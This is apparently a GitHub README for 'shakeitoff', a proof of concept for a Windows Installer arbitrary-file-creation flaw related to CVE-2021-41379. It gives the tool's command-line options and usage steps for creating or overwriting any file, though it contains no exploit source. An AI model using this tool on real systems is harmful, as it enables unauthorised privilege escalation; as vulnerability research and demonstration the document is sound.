# shakeitoff

A smaller, minimized, and cleaner version of [InstallerFileTakeOver](https://github.com/klinix5/InstallerFileTakeOver) aka the zero-day exploit that is a "variation" of CVE-2021-41379. This version *does not* pop a shell like `InstallerFileTakeOver`. The point of this code was to create a simpler proof of concept that more reliably demonstrates the file creation attack. This proof of concept will create the arbitrary file requested by the user (and copy itself into it to prove writablity). Demonstrating code execution is a trivial excercise left up to the reader.

To understand how the attack works, please see the [AttackerKB write up](https://attackerkb.com/topics/7LstI2clmF/cve-2021-41379/rapid7-analysis).

## Usage

The tool requires three parameters:

```
C:\Users\albinolobster\source\repos\shakeitoff\x64\Release>.\shakeitoff.exe
option "msi_path" is required
Allowed options:
  -h, --help              produce help message
  -m, --msi_path arg      The path to the MSI to install
  -i, --install_path arg  The path to install to
  -p, --target_path arg   The file to create
```

1. -m - the msi to install (full path required). One is provided in this repository (and you should use it since the file paths actually matter).
2. -i - the install path (full path required). This is where the msi is installed / the exploit goes down. The user must specify this beforehand and it *must* be an empty directory. The tool doesn't clean it up because it makes figuring out the bug easier. There also must be a trailing \ because I'm a monster.
3. -p - the file to overwrite/create. Full path required.


The PoC will just copy itself into the target file.
